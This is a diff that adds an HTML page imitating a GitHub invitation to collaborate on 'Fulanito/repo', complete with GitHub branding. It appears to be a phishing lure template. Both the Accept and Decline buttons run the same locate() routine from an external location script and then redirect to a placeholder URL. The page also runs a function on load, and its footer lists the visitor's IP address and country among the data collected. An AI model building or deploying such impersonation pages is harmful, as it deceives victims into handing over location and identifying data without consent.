@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="description" content="Web word processing, presentations and spreadsheets">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <title>Invitation to join Fulanito</title>
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <link rel="shortcurt icon" href="images/github-mark-white.png">
+    <script type="text/javascript">
+        if (window.location.protocol == "http:") {
+            var restOfUrl = window.location.href.substr(5);
+            window.location = "https:" + restOfUrl;
+        }
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" src="js/location.js"></script>
+</head>
+
+<body onload="information();">
+    <div class="header">
+        <div class="header-top">
+            <div class="header-left">
+                <img class="arriba" src="images/menu.png" alt="menu">
+                <img class="logo" src="images/github-mark-white.png" alt="GitHub Logo">
+                <div class="breadcrumb">
+                    Fulanito <span>/</span> <strong>repo</strong>
+                </div>
+            </div>
+            <div class="header-right">
+                <img class="icon" src="images/barranavegacion.png" alt="icons">
+                <img class="fotito" src="images/dewey.jpg" alt="avatar">
+            </div>
+        </div>
+        <div class="nav-tools">
+            <img src="images/herramientas.png" alt="herramientas">
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="invitation-box">
+            <div class="avatars">
+                <img src="images/github-mark-white.png" alt="avatar1">
+                <p> + </p>
+                <img src="images/dewey.jpg" alt="avatar2">
+            </div>
+            <div class="invitation-text">
+                <h3><a href="">Fulanito</a> invited you to collaborate on</h3>
+                <h3>Fulanito/repo</h3>
+            </div>
+            <div class="buttons">
+                <button id="accept" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Accept invitation</button>
+                <button id="decline" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Decline invitation</button>
+            </div>
+            <div class="details">
+                <p>Owners of repo will be able to see:</p>
+                <ul>
+                    <li>Your public profile information</li>
+                    <li><a href="#">Certain activity</a> within this repository</li>
+                    <li>Country of request origin</li>
+                    <li>Your access level for this repository</li>
+                    <li>Your IP address</li>
+                </ul>
+            </div>
+            <div class="footer">
+                Is this user sending spam or malicious content?<br>
+                <a href="#">Block Fulanito</a>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
